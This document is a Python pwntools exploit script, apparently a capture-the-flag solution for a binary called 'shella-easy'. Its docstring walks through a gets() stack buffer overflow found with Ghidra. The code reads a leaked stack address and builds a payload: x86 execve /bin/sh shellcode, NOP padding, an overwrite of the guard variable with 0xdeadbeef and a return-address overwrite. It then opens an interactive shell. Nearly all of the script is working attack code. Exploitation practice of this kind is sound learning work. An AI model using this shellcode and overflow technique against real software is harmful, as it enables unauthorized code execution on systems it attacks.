#!/usr/bin/python3
'''
No protection implemented, this should not be too hard.
Peaking at the main function from Ghidra:
    -------------------------------
    {
      char local_4c [64];
      int local_c;
      
      setvbuf(stdout,(char *)0x0,2,0x14);
      setvbuf(stdin,(char *)0x0,2,0x14);
      local_c = -0x35014542;
      printf("Yeah I\'ll have a %p with a side of fries thanks\n",local_4c);
      gets(local_4c);
      if (local_c != -0x21524111) {
        exit(0);
      }
      return 0;
    }
    -------------------------------
gets() is vulnerable,
local var has size of 64 bytes,
we just need to overflow this, change local_c value to 0xdeadbeef, fill up the padding, and overwrite eip
The local mem addr is so leaked, we will put the shellcode here, followed by the padding to 0xdeadbeef, followed by the padding to eip.

Shell popped!
'''
import pwn as p

def pwn():
    start = p.process('./shella-easy')
    
    # Grab the leaked mem addr
    line1 = start.recvline()
    varAddr = line1[17:-29] # <- leaked mem address
    strAddr = varAddr.decode('utf8')

    # Craft the payload
    shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80' # <- 23 bytes
    padding1 = b'\x90'*(0x40 - len(shellcode))
    padding2 = b'\x90'*0x8
    payload = shellcode + padding1 + p.p32(0xdeadbeef) + padding2 + p.p32(int(strAddr, 16))

    # Send the payload
    start.sendline(payload)
    start.interactive()
    
if __name__ == "__main__":
    pwn()
